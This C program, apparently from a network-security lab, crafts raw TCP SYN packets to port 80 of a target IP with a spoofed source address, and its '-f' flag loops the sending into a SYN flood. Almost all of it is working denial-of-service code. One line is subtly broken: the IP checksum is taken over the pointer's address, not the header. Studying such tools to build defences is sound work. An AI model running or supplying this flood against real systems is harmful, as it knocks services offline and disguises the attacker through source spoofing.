#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <errno.h>
#include "header.h"

const int BUFFER_SIZE = 1500;
// Number of miliseconds to wait between packets when flooding
const int SLEEP_TIME = 10;

unsigned short checksum(unsigned short* data, int length) {
	int sum = 0;
	for (int i = 0; i < length; i += 2) {
		sum += *data;
		data++;
	}
	
	sum = (sum >> 16) + (sum & 0xFFFF);
	sum += sum >> 16;
	return (unsigned short) ~sum;
}

void sigint(int num) {
	exit(0);
}

// Sleep for the specified amount of miliseconds
void sleepMs(int time) {
	if (time > 0) {
		struct timespec ts;
		ts.tv_sec = time / 1000;
		ts.tv_nsec = time % 1000 * 1000000;
		nanosleep(&ts, &ts);
	}
}

// Expected arguments:
//    1: Destination IP address
//    2: -f to flood, nothing to send a single packet
int main(int argc, char* argv[]) {
	if (argc < 2) {
		printf("Error: The destination IP address must be specified\n");
		exit(1);
	}
	
	// Register signal handler to stop when Ctrl-C is received
	struct sigaction action;
    memset(&action, 0, sizeof(action));
    action.sa_handler = sigint;
    sigaction(SIGINT, &action, NULL);
	
	char buffer[BUFFER_SIZE];
	struct ipheader *ip = (struct ipheader *) buffer;
	struct tcpheader *tcp = (struct tcpheader *)(buffer + sizeof(struct ipheader));

	memset(buffer, 0, BUFFER_SIZE);
	// Fill in the TCP header
	tcp->tcp_sport = htons(1234); // Arbitrary source port
	tcp->tcp_dport = htons(80);
	tcp->tcp_seq = 0;
	tcp->tcp_offx2 = 0x50;
	tcp->tcp_flags = TH_SYN; // Set SYN flag
	tcp->tcp_win = htons(20000);
	tcp->tcp_sum = 0;

	// Fill in the IP header
	ip->iph_ver = 4;
	ip->iph_ihl = 5;
	ip->iph_ttl = 50;
	ip->iph_sourceip.s_addr = inet_addr("1.2.3.4");
	ip->iph_destip.s_addr = inet_addr(argv[1]);
	ip->iph_protocol = IPPROTO_TCP;
	ip->iph_len = htons(sizeof(struct ipheader) + sizeof(struct tcpheader));
	ip->iph_chksum = checksum((unsigned short *) &ip, sizeof(struct ipheader));

	// Calculate tcp checksum
	struct pseudo_tcp psh;
	psh.saddr = ip->iph_sourceip.s_addr;
	psh.daddr = ip->iph_destip.s_addr;
	psh.mbz = 0;
	psh.ptcl = IPPROTO_TCP;
	psh.tcpl = htons(20);
	memcpy(&psh.tcp, tcp, sizeof (struct tcpheader));
	tcp->tcp_sum = checksum((unsigned short*) &psh, sizeof (struct pseudo_tcp));
	
	// Create socket
	struct sockaddr_in dest_info;
	dest_info.sin_family = AF_INET;
	dest_info.sin_port = htons(80);
	dest_info.sin_addr.s_addr = inet_addr(argv[1]);
	int enable = 1;

	// Create a raw network socket. Requires cap_net_raw capability.
	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if (sock < 0) {
		printf("Error creating socket. Errno %d: %s\n", errno, strerror(errno));
		exit(1);
	}

	// Set socket option
	if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable)) < 0) {
		printf ("Error setting IP_HDRINCL. Errno %d: %s\n" , errno , strerror(errno));
		exit(1);
	}

	// Send the packet, or flood if the corresponding argument was set.
	int flood = argc > 2 && (strcmp(argv[2], "-f") == 0);
	do {
		if (sendto(sock, ip, ntohs(ip->iph_len), 0, (struct sockaddr *)&dest_info, sizeof(dest_info)) < 0) {
			printf("Error sending packet. Errno %d: %s\n", errno, strerror(errno));
			exit(1);
		}
		sleepMs(SLEEP_TIME);
	} while (flood);

	return 0;
}
